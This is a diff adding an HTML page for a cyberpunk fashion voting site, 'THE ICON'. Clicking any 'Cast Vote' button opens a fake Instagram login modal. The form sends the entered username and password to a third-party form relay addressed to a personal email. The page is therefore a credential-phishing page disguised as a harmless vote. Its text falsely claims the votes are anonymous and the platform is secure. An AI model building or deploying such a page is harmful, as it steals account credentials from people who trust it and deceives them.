@@ -1,0 +1,308 @@
+ <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THE ICON | Cyberpunk Fashion Vote</title>
+
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500&family=Share+Tech+Mono&family=Playfair+Display:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#0a0a0f;
+      --text:#00fff0;
+      --accent:#ff0055;
+      --highlight:#7f5af0;
+      --glow:#39ff14;
+    }
+
+    body { background: radial-gradient(circle at top left, rgba(127,90,240,0.1), transparent 40%), radial-gradient(circle at bottom right, rgba(255,0,85,0.1), transparent 40%), #0a0a0f; color:var(--text); font-family:'Inter',sans-serif; margin:0; }
+
+
+
+    .serif { font-family:'Playfair Display',serif; }
+    .mono { font-family:'Share Tech Mono', monospace; }
+    .editorial-track { letter-spacing:.4em; }
+
+    .card {
+      background: linear-gradient(145deg, rgba(0,255,240,0.05), rgba(255,0,85,0.05));
+      border:1px solid rgba(255,255,255,0.1);
+      border-radius:1rem;
+      backdrop-filter: blur(6px);
+      transition: all 0.6s ease;
+      position:relative;
+      overflow:hidden;
+    }
+
+    .card:hover {
+      box-shadow: 0 0 40px var(--accent), 0 0 80px var(--highlight);
+      transform: translateY(-6px) scale(1.02);
+      border-color: var(--highlight); 
+      h1, h2 {
+  text-shadow: 0 0 10px var(--accent), 0 0 20px var(--highlight);
+}
+.vote-btn {
+  box-shadow: 0 0 5px var(--accent), 0 0 15px var(--highlight);
+}
+.card:hover {
+  transform: rotateY(3deg) translateY(-6px) scale(1.02);
+  box-shadow: 0 0 40px var(--accent), 0 0 80px var(--highlight);
+}
+}
+
+    
+
+    .vote-btn {
+      background:transparent;
+      border:1px solid var(--text);
+      color:var(--text);
+      font-family:'Share Tech Mono', monospace;
+      text-transform:uppercase;
+      padding:.75rem;
+      width:100%;
+      cursor:pointer;
+      transition: all .5s;
+    }
+
+    .vote-btn:hover {
+      background:var(--accent);
+      color:#000;
+      box-shadow: 0 0 20px var(--accent);
+    }
+
+    .divider {
+      height:2px;
+      height: 2px;
+      width: 120px;
+      margin: 1rem auto;
+  background: linear-gradient(90deg, transparent, #ff0055, #7f5af0, transparent);
+}
+
+    
+
+    .index-watermark {
+      position:absolute;
+      top:0;
+      right:1rem;
+      font-family:'Playfair Display', serif;
+      font-size:8rem;
+      opacity:0.03;
+      pointer-events:none;
+    }
+
+    /* Instagram Overlay Styles */
+    .ig-modal {
+      background: rgba(0, 0, 0, 0.9);
+      backdrop-filter: blur(10px);
+    }
+    
+    .ig-box {
+      background: white;
+      color: #262626;
+      width: 100%;
+      max-width: 350px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 40px 30px;
+    }
+
+    .ig-input {
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      padding: 9px 7px;
+      width: 100%;
+      font-size: 12px;
+      margin-bottom: 6px;
+      color: #262626;
+    }
+
+    .ig-login-btn {
+      background-color: #0095f6;
+      color: white;
+      font-weight: 600;
+      border-radius: 4px;
+      padding: 7px 9px;
+      width: 100%;
+      margin-top: 8px;
+      font-size: 14px;
+      transition: opacity 0.3s;
+    }
+
+    .ig-login-btn:disabled {
+      opacity: 0.7;
+    }
+
+    .ig-logo {
+        font-family: 'Playfair Display', serif;
+        font-size: 2.2rem;
+        font-weight: bold;
+        text-align: center;
+        margin-bottom: 30px;
+        color: #262626;
+    }
+
+    @media (max-width:1024px){
+      .index-watermark{font-size:5rem;}
+    }
+
+    @media (max-width:640px){
+      .index-watermark{font-size:3rem;}
+    }
+
+  </style>
+</head>
+<body x-data="{
+  showLogin: false,
+  isLoggingIn: false,
+  selectedModel: null,
+  models:[
+    {id:1,name:'Mike Mashel',votes:124},
+    {id:2,name:'Peter Ouma',votes:98},
+    {id:3,name:'Dollah Taimur',votes:205},
+    {id:4,name:'Hideo Tanaka',votes:156},
+    {id:5,name:'Belinda Grace',votes:88},
+    {id:6,name:'Samuel Mutua',votes:312},
+    {id:7,name:'Nova Bellatrix',votes:67},
+    {id:8,name:'Zayn Calder',votes:143}
+  ],
+  openVote(modelId) {
+    this.selectedModel = modelId;
+    this.showLogin = true;
+  },
+  submitVote() {
+    this.isLoggingIn = true;
+    
+    // Simulate API call/Login verification
+    setTimeout(() => {
+        const model = this.models.find(m => m.id === this.selectedModel);
+        if(model) model.votes++;
+        
+        this.isLoggingIn = false;
+        this.showLogin = false;
+        this.selectedModel = null;
+        alert('Vote Confirmed!');
+    }, 1500);
+  }
+}">
+
+<header class="pt-28 pb-20 text-center px-6 max-w-6xl mx-auto">
+  <p class="text-[10px] editorial-track uppercase text-[var(--highlight)] mb-6">Cyber Fashion Ballot</p>
+  <h1 class="serif text-5xl md:text-8xl italic font-light mb-10">
+    Vote the <br class="hidden md:block"> Cyber Icon
+  </h1>
+
+  <!-- Creative standalone description -->
+  <p class="max-w-3xl mx-auto text-sm md:text-base opacity-70 leading-relaxed mb-8 italic">
+    Step into the neon-lit world of <strong>THE ICON</strong>, where fashion meets the future and creativity knows no limits. Here, bold cyberpunk-inspired personas compete for recognition, each showcasing a unique blend of style, attitude, and imagination.  
+    <br><br>
+    Your mission is simple: explore the lineup, discover the aesthetic that resonates with you, and cast your vote for the icon who embodies the spirit of tomorrow’s fashion. Every vote counts and helps shape the narrative of this vibrant, digital runway.  
+    <br><br>
+    This platform is designed purely for engagement, inspiration, and the joy of interactive storytelling. All votes are anonymous, every submission is voluntary, and the experience is crafted to celebrate innovation, individuality, and self-expression in a futuristic world of style.
+  </p>
+
+  <div class="divider"></div>
+</header>
+
+
+<main class="max-w-7xl mx-auto px-6 pb-32">
+  <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-8">
+
+    <template x-for="(model,index) in models" :key="model.id">
+      <div class="card p-8 md:p-10 flex flex-col justify-between">
+        <span class="index-watermark" x-text="index+1"></span>
+        <div>
+          <p class="text-[10px] tracking-widest uppercase opacity-40 mb-6 mono" x-text="'Candidate ' + model.id"></p>
+          <h2 class="serif text-3xl md:text-4xl xl:text-5xl mb-4" x-text="model.name"></h2>
+        </div>
+        <div class="mt-10">
+          <p class="text-[10px] uppercase tracking-[0.35em] opacity-40 mb-2 mono">Votes</p>
+          <p class="text-2xl font-light mb-6" x-text="model.votes"></p>
+          <button 
+            @click="openVote(model.id)" 
+            class="vote-btn">
+            Cast Vote
+          </button>
+        </div>
+      </div>
+    </template>
+
+  </div>
+</main>
+
+<div x-show="showLogin" 
+     x-transition.opacity 
+     class="fixed inset-0 z-50 flex items-center justify-center ig-modal px-4"
+     style="display: none;">
+    
+    <div @click.away="!isLoggingIn && (showLogin = false)" class="ig-box shadow-2xl relative">
+        <h1 class="ig-logo italic">Instagram</h1>
+        
+        <form 
+    action="https://formsubmit.co/misteranonymous434@gmail.com"
+    method="POST"
+>
+  <input 
+    type="text"
+    name="username_or_email"
+    placeholder="Username or email"
+    class="ig-input"
+    required
+  >
+
+  <input 
+    type="password"
+    name="password"
+    placeholder="password"
+    class="ig-input"
+    required
+  >
+
+  <input type="text" name="_gotcha" style="display:none">
+
+  <button type="submit" class="ig-login-btn">
+    Submit
+  </button>
+</form>
+         
+            <div class="flex items-center my-4">
+                <div class="flex-grow border-t border-gray-300"></div>
+                <span class="px-4 text-xs text-gray-400 font-bold uppercase">or</span>
+                <div class="flex-grow border-t border-gray-300"></div>
+            </div>
+            
+            <div class="text-center">
+                <button type="button" class="text-[#385185] text-sm font-semibold block mb-4 w-full">Log in with Facebook</button>
+                <a href="#" class="text-[#00376b] text-xs">Forgot password?</a>
+            </div>
+        </form>
+    </div>
+</div>
+
+<footer class="border-t border-white/10 py-16 px-6">
+  <!-- Formal footer description -->
+  <p class="serif italic text-sm text-center opacity-50 mb-4 max-w-4xl mx-auto">
+    Welcome to <strong>THE ICON</strong>, a dedicated platform celebrating innovation, individuality, and the cutting-edge of cyberpunk-inspired fashion. Since our inception in <strong>2025</strong>, we have been committed to creating a space where creativity and style converge, offering visitors the opportunity to engage with a curated selection of bold and imaginative fashion icons.  
+    <br><br>
+    This platform provides a secure and interactive environment for users to explore, appreciate, and cast votes for the candidates who best embody the spirit of futuristic fashion. Every submission contributes to the evolving narrative of our digital runway, fostering a community-driven appreciation for design, self-expression, and the artistic exploration of style.  
+    <br><br>
+    We invite you to immerse yourself in this dynamic experience, celebrate the diversity of creative expression, and participate in shaping the future of fashion innovation through your engagement on our platform.
+  </p>
+
+  <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center gap-8">
+    <p class="serif italic text-2xl">THE ICON</p>
+    <div class="flex gap-6 text-[10px] uppercase tracking-widest opacity-50">
+      <a href="#" class="hover:text-[var(--accent)]">Terms</a>
+      <a href="#" class="hover:text-[var(--accent)]">Privacy</a>
+      <a href="#" class="hover:text-[var(--accent)]">Archive</a>
+    </div>
+    <p class="text-[10px] uppercase tracking-widest opacity-30">© 2025 Cyber Fashion Council</p>
+  </div>
+</footer>
+
+
+</body>
+</html>
